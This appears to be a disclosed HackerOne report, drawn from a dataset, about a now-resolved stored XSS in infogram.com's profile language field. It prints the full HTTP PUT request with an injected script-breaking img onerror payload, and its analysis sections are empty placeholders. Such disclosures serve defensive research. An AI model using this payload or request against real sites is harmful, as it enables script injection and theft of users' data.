---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '430029'
original_report_id: '430029'
title: Stored XSS in infogram.com via language
weakness: Cross-site Scripting (XSS) - Stored
team_handle: infogram
created_at: '2018-10-28T21:18:50.797Z'
disclosed_at: '2019-06-22T07:54:17.827Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 20
asset_identifier: infogram.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# Stored XSS in infogram.com via language

## Metadata

- HackerOne Report ID: 430029
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: infogram
- Disclosed At: 2019-06-22T07:54:17.827Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

The stored XSS was found in the language profile parameter.

POC:
Change profile settings with following request:

```http
PUT /api/users/me HTTP/1.1
Host: infogram.com
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:63.0) Gecko/20100101 Firefox/63.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
csrf-token: **your token**
X-Requested-With: XMLHttpRequest
Content-Length: 135
DNT: 1
Connection: close
Cookie: **your cookies**

first_name=name&last_name=name&username=&confirm_password=password&language=></script><img src=x onerror=alert(document.domain)>;//
```
Go to your public profile link.

example: https://infogram.com/dd_ddt7

## Impact

This allows an attacker to inject custom Javascript codes that can be used to steal information from infogram's users.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
